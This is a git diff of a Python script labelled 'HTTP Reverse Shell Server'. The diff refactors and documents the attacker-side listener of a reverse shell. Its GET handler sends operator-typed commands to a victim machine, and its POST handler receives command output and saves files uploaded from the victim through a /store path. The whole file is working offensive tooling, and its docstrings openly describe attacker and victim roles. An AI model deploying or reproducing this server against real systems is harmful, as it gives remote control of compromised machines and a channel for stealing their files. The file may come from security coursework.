@@ -1,13 +1,33 @@
+#!/usr/bin/env python3
+
 import socketserver
 import http.server
 import cgi
 from colorama import Fore, Back, Style
 
-PORT = 8088
+PORT = 8080
+"""
+Authors: Jordan Sosnowski and John Osho
+Date: November 1, 2019
+
+HTTP Reverse Shell Server
+"""
 
 
-class ReverseShell(http.server.BaseHTTPRequestHandler):
+class ReverseShellHandler(http.server.BaseHTTPRequestHandler):
+    """
+    Custom Class that inherits from the base http handler
+
+    Defines GET and POST methods
+
+    """
+
     def do_GET(self):
+        """
+        When the server is hit with a GET request 
+        it requires input from the attacker that will 
+        be sent back to the victims machine
+        """
 
         command = input(Fore.YELLOW + ">> ")
 
@@ -22,6 +42,14 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
         self.wfile.write(command.encode())
 
     def do_POST(self):
+        """
+        When the server is hit with a POST request it will
+        first check to see if the path has been appended with /store
+        meaning that it is sending a file back. If so the file parsed 
+        and returned to its original format using FieldStorage and is saved.
+
+        Otherwise if store is not in the path the data from the POST is printed out
+        """
         if self.path == '/store':  # Check whether /store is appended or not
 
             ctype, _ = cgi.parse_header(
@@ -39,8 +67,10 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.end_headers()
             return
+
         self.send_response(200)
         self.end_headers()
+
         # Define the length which means how many bytes the HTTP POST data contains
         length = int(self.headers['Content-Length'])
 
@@ -50,10 +80,15 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
         print(Style.RESET_ALL)
 
 
-with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
-    print(f"serving at port {PORT}")
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        print("Server is terminated")
-        httpd.server_close()
+def main():
+    with socketserver.TCPServer(("", PORT), ReverseShellHandler) as httpd:
+        print(f"serving at port {PORT}")
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("Server is terminated")
+            httpd.server_close()
+
+
+if __name__ == "__main__":
+    main()
